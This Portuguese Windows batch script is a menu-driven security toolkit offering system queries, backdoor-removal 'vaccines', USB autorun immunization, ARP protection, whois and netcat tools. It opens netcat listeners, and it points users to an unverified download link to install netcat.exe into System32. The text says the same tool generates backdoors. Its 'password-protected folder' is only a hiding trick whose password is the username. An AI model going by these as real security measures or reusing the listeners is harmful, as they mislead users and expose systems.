@echo off                                                                                
color 0c                                                                                 
echo.                                                                                    
echo        (  (                 )\ )                            )     )                
echo         )\))(   ' (         (()/(   (        (   (   (   ( /( (  ( /               
echo        ((_)()\ )  )\   (     /(_)) ))\  (    ))\  )(  )\  )\()))\ ) ) /      
echo         (())\_)()((_)  )\ ) (_)) ()/((_) )\ /((_)(()\((_)(_))/(()/( ()/         
echo           ((_)/_/ (_) __/( /____(_____))___((_)(_))( ((_)(__)____)_)\_             
echo            / )( \(  )(  ( \/ ___)( __ )/ __)/ )( \(  _  (  (_  _) \/ )         
echo            \ /\ / )( /    /\___ \ ) _)( (__ ) \/ ( )    / )(  )(  )  /         
echo            (_/\_)(__)\_)__)(____/(____)\___)\____/(__ \_)(__)(__)(__/          
echo.                                                                                    
echo        === Projeto desenvolvido por Sebastiao Alves de Almeida ===                  
echo.                                                                                    
echo                   === ======================================== ===                  
echo. & echo. & echo. & echo. & echo. & echo. & echo. & echo.                            
pause                                                                                    
:1x                                                                              
Title SegurnacaWindowsNET 2.0                                                         
cls                                                                              
color 0A                                                                         
echo.                                                                            
echo   Ola %USERNAME%!   Computador: %COMPUTERNAME% - %DATE% - %TIME%    
echo.                                                                            
echo   +-----------------------------+                                           
echo   ^| 1 - Gerenciamento Local     ^|                    ,,,,,,               
echo   ^|                             ^|                o#'9MMHb':'-,o,          
echo   ^| 2 - Defesas                 ^|             .oH":HH$'"' '-*R-o,       
echo   ^|                             ^|            dMMM*""  '`' .oM"HM?.     
echo   ^| 3 - Scan e Monitoramento    ^|          ,MMM'         "HLbd< ?&H\    
echo   ^|                             ^|         .:MH ."\          `MM  MM&b   
echo   ^| 4 - Pentest                 ^|        . " *H    -      &MMMMMMMMMH:   
echo   ^|                             ^|        .    dboo        MMMMMMMMMMMM.   
echo   ^| 5 - Clientes                ^|        .   dMMMMMMb      *MMMMMMMMMP.   
echo   ^|                             ^|        .    MMMMMMMP        *MMMMMP .   
echo   ^| 6 - Redes                   ^|             `#MMMMM           MM6P ,    
echo   ^|                             ^|         '    `MMMP"          HM*`,     
echo   ^| 7 - Utilitarios             ^|          '    :MM             .- ,      
echo   ^|                             ^|           '.   `#?..  .       ..'       
echo   ^| 8 - Sobre o Script          ^|              -.   .         .-          
echo   +-----------------------------+                ''-.oo,oo.-''              
echo.                                                                            
choice /C 123456789 /M "Escolha uma das opcoes"                                
IF %ERRORLEVEL%==1 goto :A                                                     
IF %ERRORLEVEL%==2 goto :B                                                     
IF %ERRORLEVEL%==3 goto :C                                                     
IF %ERRORLEVEL%==4 goto :D                                                     
IF %ERRORLEVEL%==5 goto :E                                                     
IF %ERRORLEVEL%==6 goto :F                                                     
IF %ERRORLEVEL%==7 goto :G                                                     
IF %ERRORLEVEL%==8 goto :H                                                     
IF %ERRORLEVEL%==9 goto :I                                                     
:A                                                                               
cls                                                                              
echo.                                                                            
echo * Gerenciamento local                                                       
echo   ^|                                                                        
echo   +-^> 1 - Configuracoes TCP/IP                                             
echo   ^|                                                                        
echo   +-^> 2 - Dados  sistema                                                   
echo   ^|                                                                        
echo   +-^> 3 - Gerenciar processos                                              
echo   ^|                                                                        
echo   +-^> 4 - Visualizar conex‰es                                              
echo   ^|                                                                        
echo   +-^> 5 - Visualizar o IP p£blico                                          
echo   ^|                                                                        
echo   +-^> 6 - Visualizar o endereco f°sico                                     
echo   ^|                                                                        
echo   +-^> 7 - Retornar ao menu principal                                       
echo.                                                                            
choice /C 1234567 /M "Escolha uma das opcoes"                                  
IF %ERRORLEVEL%==1 goto :AA                                                    
IF %ERRORLEVEL%==2 goto :AB                                                    
IF %ERRORLEVEL%==3 goto :AC                                                    
IF %ERRORLEVEL%==4 goto :AD                                                    
IF %ERRORLEVEL%==5 goto :AE                                                    
IF %ERRORLEVEL%==6 goto :AF                                                    
IF %ERRORLEVEL%==7 goto 1x                                                     
:AA                                                                              
cls                                                                              
echo.                                                                            
ipconfig /all                                                                    
echo.                                                                            
choice /C SN /M "Retornar ao menu anterior"                                   
IF %ERRORLEVEL%==1 goto :A                                                    
IF %ERRORLEVEL%==2 exit                                                       
:AB                                                                             
cls                                                                             
systeminfo                                                                      
echo.                                                                           
choice /C SN /M "Retornar ao menu anterior"                                   
IF %ERRORLEVEL%==1 goto :A                                                    
IF %ERRORLEVEL%==2 exit                                                       
:AC                                                                             
cls                                                                             
echo.                                                                           
echo * Gerenciar processos                                                      
echo   ^|                                                                       
echo   ^|                                                                       
echo   +-^> 1 - Visualizar Processos                                            
echo   ^|                                                                       
echo   +-^> 2 - Finalizar processo                                              
echo   ^|                                                                       
echo   +-^> 3 - Retornar ao menu anterior                                       
echo.                                                                           
choice /C 123 /M "Escolha uma das opcoes"                                     
IF %ERRORLEVEL%==1 goto :1B                                                   
IF %ERRORLEVEL%==2 goto :2B                                                   
IF %ERRORLEVEL%==3 goto :A                                                    
:AD                                                                             
cls                                                                             
echo.                                                                           
echo * Visualizar conex‰es                                                      
echo   ^|                                                                       
echo   +-^> 1 - Somente TCP                                                     
echo   ^|                                                                       
echo   +-^> 2 - TCP e UDP                                                       
echo   ^|                                                                       
echo   +-^> 3 - Retornar ao menu anterior                                       
echo.                                                                           
choice /C 123 /M "Escolha uma das opcoes"                                     
IF %ERRORLEVEL%==1 goto :1A                                                   
IF %ERRORLEVEL%==2 goto :2A                                                   
IF %ERRORLEVEL%==3 goto :A                                                    
:AE                                                                              
cls                                                                              
echo.                                                                            
echo   Visualizar o IP publico (by Insecuritynet)                                
echo. & echo. & echo.                                                            
echo   Uma pagina sera aberta em seu navegador padrao, aguarde!                  
echo. & echo. & echo.                                                            
ping 127.0.01 -n 3 > nul                                                         
start http://www.insecuritynet.com.br/ferramentas-online/meu-ip                  
choice /C SN /M "Retornar ao menu anterior"                                    
IF %ERRORLEVEL%==1 goto :A                                                     
IF %ERRORLEVEL%==2 exit                                                        
:AF                                                                              
cls                                                                              
getmac /v /fo list                                                               
echo.                                                                            
choice /C SN /M "Retornar ao menu anterior"                                    
IF %ERRORLEVEL%==1 goto :A                                                     
IF %ERRORLEVEL%==2 exit                                                        
:1A                                                                              
cls                                                                              
echo.                                                                            
netstat -pb TCP                                                                  
echo.                                                                            
choice /C SN /M "Retornar ao menu anterior"                                    
IF %ERRORLEVEL%==1 goto :AC                                                    
IF %ERRORLEVEL%==2 exit                                                        
:2A                                                                              
cls                                                                              
echo.                                                                            
netstat -anob                                                                    
echo.                                                                            
choice /C SN /M "Retornar ao menu anterior"                                    
IF %ERRORLEVEL%==1 goto :AC                                                    
IF %ERRORLEVEL%==2 exit                                                        
:1B                                                                              
cls                                                                              
echo.                                                                            
echo * Visualizar Processos                                                      
echo   ^|                                                                        
echo   +-^> 1 - Todos os processos                                               
echo   ^|                                                                        
echo   +-^> 2 - Somente TCP                                                      
echo   ^|                                                                        
echo   +-^> 3 - Retornar ao menu anterior                                        
echo.                                                                            
choice /C 123 /M "Escolha uma das opcoes"                                      
IF %ERRORLEVEL%==1 goto :1B1                                                   
IF %ERRORLEVEL%==2 goto :2B2                                                   
IF %ERRORLEVEL%==3 goto :AD                                                    
:2B                                                  				
cls                                                 				
echo.                                                 				
SET /P F=Digite o nome do processo a ser finalizado:  			        
echo.                                                  			        
taskkill /f /im %F%                                    		                
echo.                                                     	                
choice /C SN /M "Retornar ao menu anterior"                                   
IF %ERRORLEVEL%==1 goto :AD                                                   
IF %ERRORLEVEL%==2 exit                                                       
:1B1                                                                            
cls                                                                             
echo.                                                                           
tasklist | find /V "Nome" | find /V "="                                     
echo.                                                            
choice /C SN /M "Retornar ao menu anterior"                    
IF %ERRORLEVEL%==1 goto :1B                                    
IF %ERRORLEVEL%==2 exit                                        
:2B2                                                             
cls                                                              
echo.                                                            
netstat -b | find /V "Proto" | find /V "TCP"                 
echo.                                                            
choice /C SN /M "Retornar ao menu anterior"                    
IF %ERRORLEVEL%==1 goto :1B                                    
IF %ERRORLEVEL%==2 exit                                        
:B                                                                                                     
cls                                                                                                    
echo.                                                                                                  
echo * Defesas                                     ^|\                     /)                         
echo   ^|                                        /\_\\__               (_//                         
echo   +-^> 1 - Antiv°rus                       ^|   `^>\-`     _._       //`)                        
echo   ^|                                        \ /` \  _.-`:::`-._  //                             
echo   +-^> 2 - Backup                            `    \^|`    :::    `^|/                            
echo   ^|                                               ^|     :::     ^|                              
echo   +-^> 3 - Honeypot (Netcat)                       ^|.....:::.....^|                              
echo   ^|                                               ^|:::::::::::::^|                              
echo   +-^> 4 - Protecao de pasta com senha             ^|     :::     ^|                              
echo   ^|                                                \     :::     /                              
echo   +-^> 5 - Protecao contra Arp Spoofing             \ \    :::    /                             
echo   ^|                                                 `-. ::: .-'                                  
echo   +-^> 6 - Revelar arquivo(s) oculto(s)       jgs     //`:::`\\                                 
echo   ^|                                                 //   '   \\                                
echo   +-^> 7 - Retornar ao menu principal               ^|/       \ \                               
echo.                                                                                                  
choice /C 1234567 /M "Escolha uma das opcoes"                                                         
IF %ERRORLEVEL%==1 goto :0C                                                                           
IF %ERRORLEVEL%==2 goto :1C                                                                           
IF %ERRORLEVEL%==3 goto :2C                                                                           
IF %ERRORLEVEL%==4 goto :3C                                                                           
IF %ERRORLEVEL%==5 goto :4C                                                                           
IF %ERRORLEVEL%==6 goto :5C                                                                           
IF %ERRORLEVEL%==7 goto :1x                                                                           
:0C                                                                                             
cls                                                                                             
echo.                                                                                           
echo   Antiv°rus em batch                                                                       
echo.                                                                                           
echo   Atencao! O antiv°rus do WinsecurityNET n∆o elimina a necessidade                         
echo   de ter um antiv°rus instalado em sua maquina!                                            
echo.                                                                                           
echo   Este antiv°rus tem por objetivo imunizar dispositivos de armazenamento                   
echo   e neutralizar os backdoors gerados pelo WinsecurityNET ou outros com                     
echo   funcoes identicas.                                                                       
echo.                                                                                           
echo * Antiv°rus                                                                                
echo   ^|                                                                                       
echo   +-^> 1 - Gerar vacina para Backdoor (conex∆o direta)                                     
echo   ^|                                                                                       
echo   +-^> 2 - Gerar vacina para Backdoor de Rede LAN                                          
echo   ^|                                                                                       
echo   +-^> 3 - Imunizar dispositivos de armazenamento                                          
echo   ^|                                                                                       
echo   +-^> 4 - Retornar ao menu anterior                                                       
echo.                                                                                           
choice /C 1234 /M "Escolha uma das opcoes"                                                    
IF %ERRORLEVEL%==1 goto :vback                                                                
IF %ERRORLEVEL%==2 goto :vbacklan                                                             
IF %ERRORLEVEL%==3 goto :idda                                                                 
IF %ERRORLEVEL%==4 goto :B                                                                    
:vback                                                                                    
cls                                                                                       
echo.                                                                                     
echo   Vacina para Backdoor (conex∆o direta)                                              
echo.                                                                                     
choice /C SN /M:"Gerar vacina agora?"                                                   
IF %ERRORLEVEL%==1 goto :vbackgo                                                        
IF %ERRORLEVEL%==2 goto :0C                                                             
:vbackgo                                                                                  
IF EXIST Vacina-Backdoor.bat GOTO :vbackgo0                                               
IF NOT EXIST Vacina-Backdoor.bat GOTO :vbackgo2                                           
:vbackgo2                                                                                 
echo.                                                                                     
echo @echo off >> Vacina-Backdoor.bat                                                     
echo sc config tlntsvr start= disabled >> Vacina-Backdoor.bat                             
echo net stop telnet >> Vacina-Backdoor.bat                                               
echo echo. >> Vacina-Backdoor.bat                                                         
echo echo   Sera preciso redefinir a senha de usuario... >> Vacina-Backdoor.bat           
echo echo. >> Vacina-Backdoor.bat                                                         
echo net user %USERNAME% * >> Vacina-Backdoor.bat                                       
echo pause >> Vacina-Backdoor.bat                                                         
echo exit >> Vacina-Backdoor.bat                                                          
echo   "Vacina-Backdoor.bat" gerada com sucesso!                                        
echo.                                                                                     
pause                                                                                     
goto :0C                                                                                  
:vbackgo0                                                                                
echo.                                                                                    
echo   N∆o sera poss°vel gerar a vacina!                                                 
echo   "Vacina-Backdoor.bat" ja existe no diret¢rio atual!                             
echo.                                                                                    
pause                                                                                    
goto :0C                                                                                 
:vbacklan                                                                                
cls                                                                                      
echo.                                                                                    
echo   Vacina para Backdoor de Rede LAN                                                  
echo.                                                                                    
choice /C SN /M:"Gerar vacina agora?"                                                  
IF %ERRORLEVEL%==1 goto :vbacklango                                                    
IF %ERRORLEVEL%==2 goto :0C                                                            
:vbacklango                                                                              
IF EXIST Vacina-Backdoor_LAN.bat GOTO :vbacklango0                                       
IF NOT EXIST Vacina-Backdoor_LAN.bat GOTO :vbacklango2                                   
:vbacklango2                                                                             
echo.                                                                                    
set /p login2x=Digite o login:                                                           
echo.                                                                                    
set /p share2x=Digite o nome de compartilhamento:                                        
echo.                                                                                    
echo @echo off >> Vacina-Backdoor_LAN.bat                                                
echo net localgroup Administradores %login2x% /delete >> Vacina-Backdoor_LAN.bat         
echo net user %login2x% /delete >> Vacina-Backdoor_LAN.bat                               
echo net share %share2x% /delete >> Vacina-Backdoor_LAN.bat                              
echo pause >> Vacina-Backdoor_LAN.bat                                                    
echo exit >> Vacina-Backdoor_LAN.bat                                                     
echo.                                                                                    
echo   "Vacina-Backdoor_LAN.bat" gerada com sucesso!                                   
echo.                                                                                    
pause                                                                                    
goto :0C                                                                                 
:vbacklango0                                                                             
echo.                                                                                    
echo   N∆o sera poss°vel gerar a vacina!                                                 
echo   "Vacina-Backdoor_LAN.bat" ja existe no diret¢rio atual!                          
echo.                                                                                     
pause                                                                                     
goto :0C                                                                                  
:idda                                                                                              
cls                                                                                                
echo.                                                                                              
echo   Imunizar dispositivos de armazenamento de dados                                             
echo.                                                                                              
echo   Esta imunizacao remove os v°rus "autorun.inf" e "Recycler"                              
echo   do seu dispositivo (caso tenha sido infectado) e aplica                                     
echo   protecao contra esses v°rus.                                                                
echo   Funciona em: HD, HD externo, pendrive, cartao de mem¢ria,                                   
echo   SSD, Mp3, Mp4, etc.                                                                         
echo.                                                                                              
choice /C SN /M "Imunizar dispositivo?"                                                           
IF %ERRORLEVEL%==1 goto :iddax                                                                    
IF %ERRORLEVEL%==2 goto :0C                                                                       
:iddax                                                                                               
echo.                                                                                                
SET /P digdisc= Digite a letra do dispositivo:                                                        
echo.                                                                                                
%digdisc%: > nul                                                                                    
del /a:h autorun.inf                                                                                  
rd /q /s RECYCLER                                                                                     
MD AUTORUN.INF                                                                                        
attrib +r +h +s "AUTORUN.INF"                                                                         
echo NADA > RECYCLER                                                                                   
attrib +r +h "RECYCLER"                                                                                
echo.                                                                                                  
echo   Imunizacao do dispositivo conclu°da!                                                             
echo.                                                                                                   
choice /C SN /M "Retornar ao menu anterior"                                                          
IF %ERRORLEVEL%==1 goto :0C                                                                          
IF %ERRORLEVEL%==2 exit                                                                            
:1C                                                                                              
cls                                                                                              
echo.                                                                                            
echo     _________________                                                                        
echo   ^|# :           : #^|                                                                      
echo   ^|  :           :  ^|                                                                      
echo   ^|  :  Backup   :  ^|                                                                      
echo   ^|  :           :  ^|                                                                      
echo   ^|  :___________:  ^|                                                                      
echo   ^|     _________   ^|                                                                      
echo   ^|    ^| __      ^|  ^|                                                                    
echo   ^|    ^|^|  ^|     ^|  ^|                                                                  
echo  \____^|^|__^|_____^|__^|lc                                                                 
echo.                                                                                             
:bkp                                                                                              
echo.                                                                                             
echo   Digite o caminho completo do diret¢rio para fazer o backup                                 
echo.                                                                                             
echo   Exemplo: C:\Users\Adm\Documents                                                         
echo.                                                                                             
set /p "Dirbkp=>"                                                                                 
echo.                                                                                             
echo   Digite o caminho completo do diret¢rio em que sera salvo o backup                          
echo.                                                                                             
echo   Exemplo: D:\Documentos\Backup                                                             
echo.                                                                                             
set /p "Dirbkp2=>"                                                                              
xcopy %Dirbkp% %Dirbkp2% /E /H /R /Y /I /D                                                    
echo.                                                                                             
choice /C SN /M:"Continuar o backup?"                                                           
IF %ERRORLEVEL%==1 goto :bkp                                                                    
IF %ERRORLEVEL%==2 goto :B                                                                      
:2C                                                                                                       
cls                                                                                                       
echo.                                                                                                     
echo     _                                        _                                                       
echo    ^| ^|                                      ^| ^|                                                  
echo    ^| ^|__   ___  _ __   ___ _   _ _ __   ___ ^| ^|_                                                 
echo    ^| '_\ / _\^| '_\ / _\ ^| ^| ^| '_\ / _\^| __^|                                             
echo    ^| ^| ^| ^| (_) ^| ^| ^| ^|  __/ ^|_^| ^| ^|_) ^| (_) ^| ^|_                                      
echo    ^|_^| ^|_^|\___/^|_^| ^|_^|\___^|\__, ^| .__/\___/\__^|                                      
echo                             __/ ^| ^|                                                             
echo                            ^|___/^|_^|                                                            
echo. & echo. & echo.                                                                                  
echo   Funcionamento do honeypot: o Netcat sera executado em outra                                     
echo   janela do Prompt e abrira uma porta em estado de escuta avancado.                               
echo.                                                                                                  
SET /P hpdoor=Digite o nß da porta:                                                                    
echo.                                                                                                   
choice /C SN /M "Ativar honeypot"                                                                       
IF %ERRORLEVEL%==1 goto :honeypot                                                                       
IF %ERRORLEVEL%==2 goto :B                                                                              
:honeypot                                                                                                 
C:                                                                                                        
CD %windir%\system32                                                                                   
IF EXIST netcat.exe GOTO :2netcat                                                                         
IF NOT EXIST netcat.exe GOTO :1netcat                                                                     
:1netcat                                                                                                  
echo.                                                                                                     
echo   E necessario ter o Netcat instalado na pasta System32!                                             
echo.                                                                                                     
echo   netcat.exe n∆o encontrado!                                                                         
echo.                                                                                                     
choice /C SN /M "Deseja baixar o aplicativo"                                                            
IF %ERRORLEVEL%==1 goto :1download                                                                      
IF %ERRORLEVEL%==2 goto :B                                                                       
:1download                                                                                          
echo.                                                                                               
echo   A pagina de download sera aberta em seu navegador padrao, aguarde!                           
echo.                                                                                               
start https://mega.nz/#!zdEExThA!qmz6hjGCSabC6_9owQ5qiSTjBtH6dPV_DZMLZIaPn0U                        
choice /C SN /M "Retornar ao menu anterior"                                                       
IF %ERRORLEVEL%==1 goto :B                                                                        
IF %ERRORLEVEL%==2 exit                                                                           
:2netcat                                                                                            
start netcat -L -vv -p %hpdoor%                                                                   
echo.                                                                                               
echo   Honeypot ativado!                                                                            
echo.                                                                                               
choice /C SN /M "Retornar ao menu anterior"                                                       
IF %ERRORLEVEL%==1 goto :B                                                                        
IF %ERRORLEVEL%==2 exit                                                                           
:3C                                                                                    
cls                                                                                    
echo.                                                                                  
echo * Protecao de pasta com senha               .----.                                
echo   ^|                                        / .--.\                              
echo   +-^> 1 - Gerar pasta (Secret)            / /   \\                             
echo   ^|                                       ^| ^|    ^| ^|                         
echo   +-^> 2 - Desbloquear pasta               ^| ^|.----.^|                          
echo   ^|                                      ///`.::::.`\                           
echo   +-^> 3 - Retornar ao menu anterior     ^|^|^| ::/  \:: ;                       
echo                                         ^|^|; ::\__/:: ;                         
echo                                       \\\ '::::' /                             
echo                                      jgs   '=':-..-'`                              
echo.                                                                                  
choice /C 123 /M "Escolha uma das opcoes"                                            
IF %ERRORLEVEL%==1 goto :dirpass                                                     
IF %ERRORLEVEL%==2 goto :UNLOCK                                                      
IF %ERRORLEVEL%==3 goto :B                                                           
:dirpass                                                                                         
echo.                                                                                            
echo   Apoes a pasta "Secret" ser gerada, salve dentro dela os arquivos que voce                
echo   quer proteger contra acessos indevidos. Feito isso, escolha a opcao                       
echo   "bloquear com senha o acesso a pasta".                                                  
echo   Para desbloquear, basta acessar o recurso de "Protecao de pasta com senha" e             
echo   selecionar a opcao "Desbloquear pasta" (necessita digitar a senha).                     
echo.                                                                                            
IF EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}" goto UNLOCK                   
IF NOT EXIST Secret goto MDLOCKER                                                                
:block                                                                                           
choice /C SN /M "Bloquear com senha o acesso a pasta?"                                         
IF %ERRORLEVEL%==1 goto :LOCK                                                                  
IF %ERRORLEVEL%==2 goto :B                                                                     
:LOCK                                                                                            
ren Secret "Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}"                             
attrib +r +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}"                        
echo.                                                                                            
echo   Pasta bloqueada! Senha para desbloqueio: %USERNAME%                                     
echo.                                                                                            
choice /C SN /M "Retornar ao menu anterior"                                                    
IF %ERRORLEVEL%==1 goto :B                                                                     
IF %ERRORLEVEL%==2 exit                                                                        
:UNLOCK                                                                                          
echo.                                                                                            
SET /P pass=   Digite a senha:                                                                   
IF NOT %pass%==%USERNAME% goto FAIL                                                          
attrib -r -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}"                        
ren "Control Panel.{21EC2020-3AEA-1069-A2DD -08002B30309D}" Secret                             
echo.                                                                                            
echo   Pasta desbloqueada!                                                                       
echo.                                                                                            
pause                                                                                            
goto :B                                                                                          
:FAIL                                                                                            
echo Senha incorreta!                                                                            
echo.                                                                                            
pause                                                                                            
goto :B                                                                                          
:MDLOCKER                                                                                        
MD Secret                                                                                        
echo.                                                                                            
echo   Pasta criada com sucesso!                                                                 
echo.                                                                                            
goto :block                                                                                      
:4C                                                                                              
cls                                                                                              
echo.                                                                                            
echo * Protecao contra Arp Spoofing                                                              
echo   ^|                                                                                        
echo   +-^> 1 - Aplicar protecao                                                                 
echo   ^|                                                                                        
echo   +-^> 2 - Desfazer uma protecao                                                            
echo   ^|                                                                                        
echo   +-^> 3 - Retornar ao menu anterior                                                        
echo.                                                                                            
choice /C 123 /M "Escolha uma das opcoes"                                                      
IF %ERRORLEVEL%==1 goto :1C1                                                                   
IF %ERRORLEVEL%==2 goto :1C2                                                                   
IF %ERRORLEVEL%==3 goto :B                                                                     
:1C1                                                                                             
echo.                                                                                            
echo   + Criar entrada arp segura +                                                              
echo.                                                                                            
SET /P IP=Digite o endereco IP do seu gateway (roteador):                                        
echo.                                                                                            
SET /P MAC=Digite o endereco MAC do gateway:                                                     
netsh interface ipv4 add neighbors "local" "%IP%" "%MAC%"                              
echo.                                                                                            
choice /C SN /M "Retornar ao menu anterior"                                                    
IF %ERRORLEVEL%==1 goto :4C                                                                    
IF %ERRORLEVEL%==2 exit                                                                        
:1C2                                                                                              
echo.                                                                                             
SET /P IP2=Digite o endereco IP do seu gateway (roteador):                                        
netsh interface ipv4 del neighbors "local" "%IP2%"                                          
echo.                                                                                             
choice /C SN /M "Retornar ao menu anterior"                                                     
IF %ERRORLEVEL%==1 goto :4C                                                                     
IF %ERRORLEVEL%==2 exit                                                                         
:5C                                                                                               
cls                                                                                               
echo.                                                                                             
echo * Revelar arquivos ocultos                                                                   
echo   ^|                                                                                         
echo   +-^> 1 - Verificar diret¢rio atual                                                         
echo   ^|                                                                                         
echo   +-^> 2 - Alterar diret¢rio                                                                 
echo   ^|                                                                                         
echo   +-^> 3 - Revelar arquivos                                                                  
echo   ^|                                                                                         
echo   +-^> 4 - Retornar ao menu anterior                                                         
echo.                                                                                             
choice /C 1234 /M:"Escolha uma das opcoes"                                                      
IF %ERRORLEVEL%==1 goto :ver1A                                                                  
IF %ERRORLEVEL%==2 goto :ir1A                                                                   
IF %ERRORLEVEL%==3 goto :abra                                                                   
IF %ERRORLEVEL%==4 goto :B                                                                      
:ver1A                                                                                             
cls                                                                                                
echo.                                                                                              
dir | find /N "Pasta"                                                                            
echo.                                                                                              
echo   Verificacao conclu°da!                                                                      
echo.                                                                                              
choice /C SN /M:"Retornar ao menu anterior"                                                      
IF %ERRORLEVEL%==1 goto :5C                                                                      
IF %ERRORLEVEL%==2 exit                                                                          
:ir1A                                                                                              
echo.                                                                                              
SET /P DIR=Digite a letra do diretorio:                                                            
echo.                                                                                              
choice /C SN /M:"Alterar o diret¢rio atual para o %DIR%?"                                       
IF %ERRORLEVEL%==1 goto :godir1                                                                     
IF %ERRORLEVEL%==2 goto :5C                                                                         
:abra                                                                                               
cls                                                                                                 
echo.                                                                                               
echo   Apenas os arquivos ocultos que estiverem dentro do diret¢rio                                 
echo   atual ser∆o relevados!                                                                       
echo.                                                                                               
choice /C SN /M:"Deseja prosseguir?"                                                              
IF %ERRORLEVEL%==1 goto :prossiga                                                                 
IF %ERRORLEVEL%==2 goto :5C                                                                       
:prossiga                                                                                           
echo.                                                                                               
attrib -h *.*                                                                                       
echo.                                                                                               
echo   Conclu°do! Verifique o diretorio.                                                            
echo.                                                                                               
choice /C SN /M:"Deseja verificar?"                                                               
IF %ERRORLEVEL%==1 goto :verifique                                                                
IF %ERRORLEVEL%==2 goto :5C                                                                       
:verifique                                                                                          
cls                                                                                                 
ping 127.0.01 -n 2 > nul                                                                            
tree /f /a                                                                                          
echo.                                                                                               
choice /C SN /M:"Salvar o resultado em um arquivo de log"                                           
IF %ERRORLEVEL%==1 goto :savlog1                                                                    
IF %ERRORLEVEL%==2 goto :5C                                                                         
:savlog1                                                                                            
echo.                                                                                               
echo   Os resultados serao salvos no arquivo "Resultado.txt"                                      
IF EXIST Resultado.txt GOTO :x01x                                                                   
IF NOT EXIST Resultado.txt GOTO :savlog2                                                            
:x01x                                                                                               
echo.                                                                                               
echo   Ja existe um arquivo "Resultado.txt" no diretorio atual!                                   
echo.                                                                                               
echo   Nao sera possivel salvar os resultados!                                                      
echo.                                                                                               
choice /C SN /M:"Retornar ao menu anterior"                                                       
IF %ERRORLEVEL%==1 goto :5C                                                                       
IF %ERRORLEVEL%==2 exit                                                                         
:savlog2                                                                                                    
echo Analise minunciosamente a lista abaixo p que possa identificar os arquivos revelados >> Resultado.txt  
echo. >> Resultado.txt                                                                                      
tree /f /a >> Resultado.txt                                                                                 
echo.                                                                                                       
echo   Log gerado! Verifique o arquivo "Resultado.txt"                                                    
echo.                                                                                                       
choice /C SN /M:"Retornar ao menu anterior"                                                               
IF %ERRORLEVEL%==1 goto :5C                                                                               
IF %ERRORLEVEL%==2 exit                                                                                   
:godir1                                                                                                     
echo.                                                                                                       
%DIR%:                                                                                                    
echo   Alteracao conclu°da!                                                                                 
echo.                                                                                                       
choice /C SN /M:"Verificar diret¢rio atual?"                                                              
IF %ERRORLEVEL%==1 goto :ver1A                                                                            
IF %ERRORLEVEL%==2 goto :5C                                                                               
:C                                                                                                          
cls                                                                                                         
echo.                                                                                                       
echo * Scan e Monitoramento                                                                                 
echo   ^|                                                                                                   
echo   +-^> 1 - Consulta (Whois)                                                                        
echo   ^|                                                                                                
echo   +-^> 2 - Port Scan (Netcat)                                                                       
echo   ^|                                                                                                
echo   +-^> 3 - Rastrear a rota para um IP                                                               
echo   ^|                                                                                                
echo   +-^> 4 - Rastrear um IP (via navegador web)                                                       
echo   ^|                                                                                                
echo   +-^> 5 - Verificar o IP retornado pelo DNS para um site                                           
echo   ^|                                                                                                
echo   +-^> 6 - Retornar ao menu principal                                                               
echo.                                                                                                    
choice /C 123456 /M "Escolha uma das opcoes"                                                           
IF %ERRORLEVEL%==1 goto :1C1                                                                           
IF %ERRORLEVEL%==2 goto :2C2                                                                           
IF %ERRORLEVEL%==3 goto :3C3                                                                          
IF %ERRORLEVEL%==4 goto :4C4                                                                          
IF %ERRORLEVEL%==5 goto :5C5                                                                          
IF %ERRORLEVEL%==6 goto 1x                                                                            
:1C1                                                                                                    
cls                                                                                                     
C:                                                                                                      
CD %windir%\system32                                                                                  
IF EXIST whois.exe GOTO :whois1                                                                         
IF NOT EXIST whois.exe GOTO :whois2                                                                    
:whois1                                                                                                
cls                                                                                                    
echo.                                                                                                  
echo   +---------------------------+                                                                   
echo   ^|      __________________   ^|                                                                 
echo   ^|  ==c(______(o(______(_()  ^|                                                                 
echo   ^|             )=\          ^|                                                                 
echo   ^|            //\\         ^|                                                                 
echo   ^|           //  \\        ^|                                                                 
echo   ^|          //Whois\\      ^|                                                                 
echo   ^|         //       \\     ^|                                                                 
echo   ^|        //         \\    ^|                                                                 
echo   +---------------------------+                                                                   
echo.                                                                                                  
SET /P whois3= Digite o endereco (URL):                                                                
echo.                                                                                                  
start whois %whois3%                                                                                 
echo.                                                                                                  
choice /C SN /M "Salvar o resultado em um arquivo de log"                                            
IF %ERRORLEVEL%==1 goto :whois4                                                                      
IF %ERRORLEVEL%==2 goto :C                                                                           
:whois4                                                                                                
cls                                                                                                    
echo.                                                                                                  
echo.                                                                                                  
echo   O resultado sera salvo no arquivo "whois.txt" em sua Desktop!                                 
ping 127.0.01 -n 3 > nul                                                                               
C:                                                                                                     
CD C:\Users\%USERNAME%\Desktop                                                                    
IF EXIST whois.txt GOTO :whois5                                                                        
IF NOT EXIST whois.txt GOTO :whois6                                                                    
:whois6                                                                                                
whois %whois3% > whois.txt                                                                           
echo.                                                                                                  
echo   Conclu°do!                                                                                      
echo.                                                                                                  
pause                                                                                                  
goto :C                                                                                                
:whois5                                                                                                
echo.                                                                                                  
echo   Nao sera poss°vel gerar o arquivo!                                                              
echo.                                                                                                  
echo   "whois.txt" ja existe na area de trabalho!                                                    
echo.                                                                                                  
pause                                                                                                  
goto :C                                                                                                
:whois2                                                                                                
cls                                                                                                    
echo.                                                                                                  
echo   E necessario ter o Whois instalado na pasta System32!                                           
echo.                                                                                                  
echo   whois.exe n∆o encontrado!                                                                       
echo.                                                                                                  
choice /C SN /M "Deseja baixar o aplicativo"                                                         
IF %ERRORLEVEL%==1 goto :downloadw                                                                   
IF %ERRORLEVEL%==2 goto :C                                                                           
:downloadw                                                                                            
cls                                                                                                   
echo.                                                                                                 
echo   O download sera iniciado em seu navegador padr∆o, aguarde!                                     
echo.                                                                                                 
start https://download.sysinternals.com/files/WhoIs.zip                                               
ping 127.0.01 -n 10 > nul                                                                             
echo   Download conclu°do!                                                                            
echo.                                                                                                 
choice /C SN /M "Retornar ao anterior"                                                              
IF %ERRORLEVEL%==1 goto :C                                                                          
IF %ERRORLEVEL%==2 exit                                                                             
:2C2                                                                                              
cls                                                                                               
C:                                                                                                
CD %windir%\system32                                                                           
IF EXIST netcat.exe GOTO :netcat1                                                                 
IF NOT EXIST netcat.exe GOTO :netcat2                                                            
:netcat1                                                                                           
cls                                                                                                
echo.                                                                                              
echo   +---------------------------+                                                               
echo   ^|      __________________   ^|                                                             
echo   ^|  ==c(______(o(______(_()  ^|                                                             
echo   ^|             )=\          ^|                                                             
